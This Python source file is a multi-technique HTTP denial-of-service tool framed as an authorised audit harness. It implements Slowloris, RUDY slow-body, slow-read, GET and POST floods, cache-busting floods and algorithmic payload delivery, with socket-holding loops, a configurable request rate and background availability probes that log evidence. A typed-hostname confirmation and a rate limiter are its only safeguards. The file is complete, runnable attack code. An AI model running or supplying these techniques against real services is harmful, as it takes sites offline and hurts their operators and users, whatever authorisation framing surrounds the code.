"""
l7_audit_py36.py - Multi-technique Layer-7 DoS audit harness (Python 3.6+).

Same behaviour and CLI as l7_audit.py, with type hints and stdlib calls
adjusted to run on Python 3.6 (typical of locked-down jump boxes that still
ship the system Python from older RHEL/Ubuntu LTS releases).

Subcommands (all live-testable L7 families):
  slow-headers   Slowloris (drip header bytes).
  slow-body      RUDY (slow POST body drip).
  slow-read      Slow read (tiny TCP receive window).
  http-flood     High-rate GET flood.
  cache-bust     GET flood with random query strings (CDN cache bypass).
  post-flood     High-rate POST flood with configurable body.
  payload        Single-payload algorithmic test (ReDoS, billion-laughs, etc.).
"""

import argparse
import datetime as dt
import http.client
import json
import logging
import random
import socket
import ssl
import string
import sys
import threading
import time
import urllib.request
from pathlib import Path
from typing import Callable, Dict, List, Optional, Tuple


USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
]


# ----------------------------------------------------------------------------
# Shared infrastructure
# ----------------------------------------------------------------------------


def confirm_authorisation(host, technique):
    # type: (str, str) -> None
    print("\nTECHNIQUE: {}".format(technique))
    print("TARGET:    {}".format(host))
    print("Run only against systems you own or have written authorisation")
    print("to test (signed Rules of Engagement).\n")
    typed = input('Type the target host ("{}") to confirm authorisation: '.format(host)).strip()
    if typed != host:
        print("Confirmation did not match. Aborting.")
        sys.exit(1)


def setup_evidence(host, technique, evidence_dir):
    # type: (str, str, str) -> Tuple[logging.Logger, Path, Path, str]
    d = Path(evidence_dir)
    d.mkdir(parents=True, exist_ok=True)
    run_id = dt.datetime.now().strftime("%Y%m%dT%H%M%S")
    base = d / "{}_{}_{}".format(technique, host, run_id)
    log_path = base.with_suffix(".log")
    jsonl_path = base.with_suffix(".jsonl")

    # logging.basicConfig(force=True) is 3.8+. Clear handlers manually for 3.6.
    root = logging.getLogger()
    for h in list(root.handlers):
        root.removeHandler(h)
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s %(levelname)s %(message)s",
        handlers=[logging.FileHandler(str(log_path)), logging.StreamHandler()],
    )
    return logging.getLogger(technique), jsonl_path, log_path, run_id


def probe(host, port, use_tls, path="/"):
    # type: (str, int, bool, str) -> Tuple[bool, float]
    start = time.monotonic()
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((host, port))
        if use_tls:
            ctx = ssl.create_default_context()
            s = ctx.wrap_socket(s, server_hostname=host)
        req = "GET {} HTTP/1.1\r\nHost: {}\r\nConnection: close\r\n\r\n".format(path, host)
        s.send(req.encode())
        data = s.recv(64)
        s.close()
        return (bool(data), time.monotonic() - start)
    except OSError:
        return (False, time.monotonic() - start)


class ProbeThread(threading.Thread):
    """Background probe at fixed interval, writes JSONL evidence."""

    def __init__(self, host, port, tls, interval, jsonl_path, get_state, stop_event):
        # type: (str, int, bool, int, Path, Callable[[], Dict], threading.Event) -> None
        super().__init__()
        self.daemon = True
        self.host, self.port, self.tls = host, port, tls
        self.interval = interval
        self.jsonl_path = jsonl_path
        self.get_state = get_state
        self.stop_event = stop_event
        self.start_time = time.monotonic()

    def run(self):
        with open(str(self.jsonl_path), "w") as f:
            while not self.stop_event.is_set():
                ok, latency = probe(self.host, self.port, self.tls)
                event = {
                    "ts": dt.datetime.now().isoformat(),
                    "elapsed_s": round(time.monotonic() - self.start_time, 2),
                    "probe_responded": ok,
                    "probe_latency_s": round(latency, 3),
                }
                event.update(self.get_state())
                f.write(json.dumps(event) + "\n")
                f.flush()
                state = "OK" if ok else "DEGRADED/DOWN"
                logging.info("probe %s latency=%.2fs %s",
                             state, latency, self.get_state())
                if self.stop_event.wait(self.interval):
                    break


def open_raw_socket(host, port, use_tls, timeout=4):
    # type: (str, int, bool, float) -> Optional[socket.socket]
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        if use_tls:
            ctx = ssl.create_default_context()
            s = ctx.wrap_socket(s, server_hostname=host)
        return s
    except OSError:
        return None


# ----------------------------------------------------------------------------
# Slow-attack subcommands
# ----------------------------------------------------------------------------


def cmd_slow_headers(a):
    confirm_authorisation(a.host, "slow-headers")
    log, jsonl, _, _ = setup_evidence(a.host, "slow-headers", a.evidence_dir)
    stop = threading.Event()
    sockets = []  # type: List[socket.socket]

    def open_one():
        s = open_raw_socket(a.host, a.port, a.tls)
        if not s:
            return None
        try:
            s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 9999)).encode())
            s.send("Host: {}\r\n".format(a.host).encode())
            s.send("User-Agent: {}\r\n".format(random.choice(USER_AGENTS)).encode())
            s.send(b"Accept-language: en-US,en,q=0.5\r\n")
            return s
        except OSError:
            return None

    for _ in range(a.sockets):
        s = open_one()
        if s:
            sockets.append(s)
    log.info("initial sockets held=%d/%d", len(sockets), a.sockets)

    probe_t = ProbeThread(a.host, a.port, a.tls, a.probe_interval, jsonl,
                          lambda: {"held_sockets": len(sockets)}, stop)
    probe_t.start()
    start = time.monotonic()

    try:
        while time.monotonic() - start < a.duration:
            alive = []
            for s in sockets:
                try:
                    s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode())
                    alive.append(s)
                except OSError:
                    try:
                        s.close()
                    except OSError:
                        pass
            while len(alive) < a.sockets:
                s = open_one()
                if s:
                    alive.append(s)
                else:
                    break
            sockets = alive
            log.info("keepalive cycle: held=%d", len(sockets))
            time.sleep(a.keepalive_interval)
    except KeyboardInterrupt:
        log.info("interrupted")
    finally:
        stop.set()
        probe_t.join(timeout=2)
        for s in sockets:
            try:
                s.close()
            except OSError:
                pass
        log.info("evidence: %s", jsonl)


def cmd_slow_body(a):
    confirm_authorisation(a.host, "slow-body")
    log, jsonl, _, _ = setup_evidence(a.host, "slow-body", a.evidence_dir)
    stop = threading.Event()
    sockets = []  # type: List[socket.socket]

    def open_one():
        s = open_raw_socket(a.host, a.port, a.tls)
        if not s:
            return None
        try:
            s.send("POST {} HTTP/1.1\r\n".format(a.path).encode())
            s.send("Host: {}\r\n".format(a.host).encode())
            s.send("User-Agent: {}\r\n".format(random.choice(USER_AGENTS)).encode())
            s.send(b"Content-Type: application/x-www-form-urlencoded\r\n")
            s.send("Content-Length: {}\r\n\r\n".format(a.content_length).encode())
            s.send(b"a")
            return s
        except OSError:
            return None

    for _ in range(a.sockets):
        s = open_one()
        if s:
            sockets.append(s)
    log.info("initial sockets held=%d/%d path=%s", len(sockets), a.sockets, a.path)

    probe_t = ProbeThread(a.host, a.port, a.tls, a.probe_interval, jsonl,
                          lambda: {"held_sockets": len(sockets)}, stop)
    probe_t.start()
    start = time.monotonic()

    try:
        while time.monotonic() - start < a.duration:
            alive = []
            for s in sockets:
                try:
                    s.send(b"a")
                    alive.append(s)
                except OSError:
                    try:
                        s.close()
                    except OSError:
                        pass
            while len(alive) < a.sockets:
                s = open_one()
                if s:
                    alive.append(s)
                else:
                    break
            sockets = alive
            log.info("drip cycle: held=%d", len(sockets))
            time.sleep(a.keepalive_interval)
    except KeyboardInterrupt:
        log.info("interrupted")
    finally:
        stop.set()
        probe_t.join(timeout=2)
        for s in sockets:
            try:
                s.close()
            except OSError:
                pass
        log.info("evidence: %s", jsonl)


def cmd_slow_read(a):
    confirm_authorisation(a.host, "slow-read")
    log, jsonl, _, _ = setup_evidence(a.host, "slow-read", a.evidence_dir)
    stop = threading.Event()
    sockets = []  # type: List[socket.socket]

    def open_one():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, a.recv_buf)
            s.settimeout(4)
            s.connect((a.host, a.port))
            if a.tls:
                ctx = ssl.create_default_context()
                s = ctx.wrap_socket(s, server_hostname=a.host)
            req = (
                "GET {} HTTP/1.1\r\n"
                "Host: {}\r\n"
                "User-Agent: {}\r\n"
                "Accept: */*\r\n"
                "Connection: keep-alive\r\n\r\n"
            ).format(a.path, a.host, random.choice(USER_AGENTS))
            s.send(req.encode())
            return s
        except OSError:
            return None

    for _ in range(a.sockets):
        s = open_one()
        if s:
            sockets.append(s)
    log.info("initial sockets held=%d/%d recv_buf=%d", len(sockets), a.sockets, a.recv_buf)

    probe_t = ProbeThread(a.host, a.port, a.tls, a.probe_interval, jsonl,
                          lambda: {"held_sockets": len(sockets)}, stop)
    probe_t.start()
    start = time.monotonic()

    try:
        while time.monotonic() - start < a.duration:
            alive = []
            for s in sockets:
                try:
                    s.settimeout(0.1)
                    try:
                        _ = s.recv(1)
                    except (socket.timeout, ssl.SSLWantReadError):
                        pass
                    alive.append(s)
                except OSError:
                    try:
                        s.close()
                    except OSError:
                        pass
            while len(alive) < a.sockets:
                s = open_one()
                if s:
                    alive.append(s)
                else:
                    break
            sockets = alive
            log.info("slow-read cycle: held=%d", len(sockets))
            time.sleep(a.read_interval)
    except KeyboardInterrupt:
        log.info("interrupted")
    finally:
        stop.set()
        probe_t.join(timeout=2)
        for s in sockets:
            try:
                s.close()
            except OSError:
                pass
        log.info("evidence: %s", jsonl)


# ----------------------------------------------------------------------------
# High-rate flood subcommands
# ----------------------------------------------------------------------------


def _flood_worker(host, port, tls, method, path_fn, body_fn, headers,
                  stop_event, counters, rate_limiter):
    while not stop_event.is_set():
        rate_limiter.wait()
        path = path_fn()
        body = body_fn() if body_fn else None
        start = time.monotonic()
        try:
            if tls:
                conn = http.client.HTTPSConnection(host, port, timeout=10,
                                                   context=ssl.create_default_context())
            else:
                conn = http.client.HTTPConnection(host, port, timeout=10)
            conn.request(method, path, body=body, headers=headers)
            resp = conn.getresponse()
            _ = resp.read(256)
            counters["requests"] += 1
            key = "status_" + str(resp.status)
            counters[key] = counters.get(key, 0) + 1
            counters["latency_sum"] += time.monotonic() - start
            conn.close()
        except OSError:
            counters["errors"] += 1
        except http.client.HTTPException:
            counters["errors"] += 1


class TokenBucket(object):
    """Simple token bucket so flood RPS is bounded (audit, not stress-to-death)."""

    def __init__(self, rps):
        # type: (float) -> None
        self.rps = rps
        self.tokens = rps
        self.lock = threading.Lock()
        self.last = time.monotonic()

    def wait(self):
        while True:
            with self.lock:
                now = time.monotonic()
                self.tokens = min(self.rps, self.tokens + (now - self.last) * self.rps)
                self.last = now
                if self.tokens >= 1:
                    self.tokens -= 1
                    return
            time.sleep(0.005)


def _run_flood(a, technique, method, path_fn, body_fn, extra_headers=None):
    confirm_authorisation(a.host, technique)
    log, jsonl, _, _ = setup_evidence(a.host, technique, a.evidence_dir)
    stop = threading.Event()
    counters = {"requests": 0, "errors": 0, "latency_sum": 0.0}
    headers = {"Host": a.host, "User-Agent": random.choice(USER_AGENTS),
               "Connection": "close"}
    if extra_headers:
        headers.update(extra_headers)
    bucket = TokenBucket(a.rps)

    workers = []
    for _ in range(a.workers):
        t = threading.Thread(target=_flood_worker,
                             args=(a.host, a.port, a.tls, method, path_fn, body_fn,
                                   headers, stop, counters, bucket))
        t.daemon = True
        t.start()
        workers.append(t)

    def state():
        n = counters["requests"] or 1
        return {"requests": counters["requests"], "errors": counters["errors"],
                "avg_latency_s": round(counters["latency_sum"] / n, 3)}

    probe_t = ProbeThread(a.host, a.port, a.tls, a.probe_interval, jsonl, state, stop)
    probe_t.start()

    log.info("flood started rps=%s workers=%s duration=%ds",
             a.rps, a.workers, a.duration)
    try:
        time.sleep(a.duration)
    except KeyboardInterrupt:
        log.info("interrupted")
    finally:
        stop.set()
        for t in workers:
            t.join(timeout=2)
        probe_t.join(timeout=2)
        log.info("totals=%s evidence=%s", state(), jsonl)


def cmd_http_flood(a):
    _run_flood(a, "http-flood", "GET", lambda: a.path, None)


def cmd_cache_bust(a):
    sep = "&" if "?" in a.path else "?"

    def path_fn():
        token = "".join(random.choice(string.ascii_letters + string.digits) for _ in range(12))
        return "{}{}_cb={}".format(a.path, sep, token)

    _run_flood(a, "cache-bust", "GET", path_fn, None,
               extra_headers={"Cache-Control": "no-cache", "Pragma": "no-cache"})


def cmd_post_flood(a):
    body = Path(a.body_file).read_bytes() if a.body_file else b""
    extra = {"Content-Type": a.content_type, "Content-Length": str(len(body))}
    _run_flood(a, "post-flood", "POST", lambda: a.path, lambda: body, extra_headers=extra)


# ----------------------------------------------------------------------------
# Algorithmic / payload subcommand
# ----------------------------------------------------------------------------


def cmd_payload(a):
    confirm_authorisation(a.host, "payload")
    log, jsonl, _, _ = setup_evidence(a.host, "payload", a.evidence_dir)
    body = Path(a.payload_file).read_bytes()
    scheme = "https" if a.tls else "http"
    url = "{}://{}:{}{}".format(scheme, a.host, a.port, a.path)

    results = []
    log.info("payload bytes=%d url=%s requests=%d", len(body), url, a.requests)

    for i in range(a.requests):
        start = time.monotonic()
        status, err = None, None
        try:
            req = urllib.request.Request(url, data=body, method=a.method,
                                         headers={"Content-Type": a.content_type,
                                                  "User-Agent": random.choice(USER_AGENTS)})
            ctx = ssl.create_default_context() if a.tls else None
            resp = urllib.request.urlopen(req, timeout=a.timeout, context=ctx)
            try:
                _ = resp.read(256)
                status = resp.status
            finally:
                resp.close()
        except Exception as e:
            err = type(e).__name__ + ": " + str(e)[:120]
        latency = time.monotonic() - start
        results.append({"i": i, "status": status, "error": err,
                        "latency_s": round(latency, 3)})
        log.info("req=%d status=%s err=%s latency=%.2fs", i, status, err, latency)

    with open(str(jsonl), "w") as f:
        for r in results:
            f.write(json.dumps(r) + "\n")
    avg = sum(r["latency_s"] for r in results) / len(results)
    log.info("done. avg_latency=%.2fs evidence=%s", avg, jsonl)


# ----------------------------------------------------------------------------
# CLI
# ----------------------------------------------------------------------------


def build_parser():
    p = argparse.ArgumentParser(description=__doc__,
                                formatter_class=argparse.RawDescriptionHelpFormatter)
    sub = p.add_subparsers(dest="cmd")
    sub.required = True  # 3.6: required= on add_subparsers not honoured; set here

    def common(sp, with_path=False):
        sp.add_argument("--host", required=True)
        sp.add_argument("--port", type=int, default=443)
        sp.add_argument("--tls", action="store_true")
        sp.add_argument("--duration", type=int, default=180)
        sp.add_argument("--probe-interval", type=int, default=5)
        sp.add_argument("--evidence-dir", default="./evidence")
        if with_path:
            sp.add_argument("--path", default="/")

    sp = sub.add_parser("slow-headers"); common(sp)
    sp.add_argument("--sockets", type=int, default=150)
    sp.add_argument("--keepalive-interval", type=int, default=15)
    sp.set_defaults(func=cmd_slow_headers)

    sp = sub.add_parser("slow-body"); common(sp, with_path=True)
    sp.add_argument("--sockets", type=int, default=150)
    sp.add_argument("--keepalive-interval", type=int, default=15)
    sp.add_argument("--content-length", type=int, default=8192)
    sp.set_defaults(func=cmd_slow_body)

    sp = sub.add_parser("slow-read"); common(sp, with_path=True)
    sp.add_argument("--sockets", type=int, default=150)
    sp.add_argument("--read-interval", type=int, default=10)
    sp.add_argument("--recv-buf", type=int, default=128)
    sp.set_defaults(func=cmd_slow_read)

    sp = sub.add_parser("http-flood"); common(sp, with_path=True)
    sp.add_argument("--rps", type=float, default=50)
    sp.add_argument("--workers", type=int, default=20)
    sp.set_defaults(func=cmd_http_flood)

    sp = sub.add_parser("cache-bust"); common(sp, with_path=True)
    sp.add_argument("--rps", type=float, default=50)
    sp.add_argument("--workers", type=int, default=20)
    sp.set_defaults(func=cmd_cache_bust)

    sp = sub.add_parser("post-flood"); common(sp, with_path=True)
    sp.add_argument("--rps", type=float, default=25)
    sp.add_argument("--workers", type=int, default=20)
    sp.add_argument("--body-file")
    sp.add_argument("--content-type", default="application/json")
    sp.set_defaults(func=cmd_post_flood)

    sp = sub.add_parser("payload"); common(sp, with_path=True)
    sp.add_argument("--payload-file", required=True)
    sp.add_argument("--method", default="POST")
    sp.add_argument("--content-type", default="application/xml")
    sp.add_argument("--requests", type=int, default=10)
    sp.add_argument("--timeout", type=int, default=30)
    sp.set_defaults(func=cmd_payload)

    return p


if __name__ == "__main__":
    args = build_parser().parse_args()
    sys.exit(args.func(args) or 0)
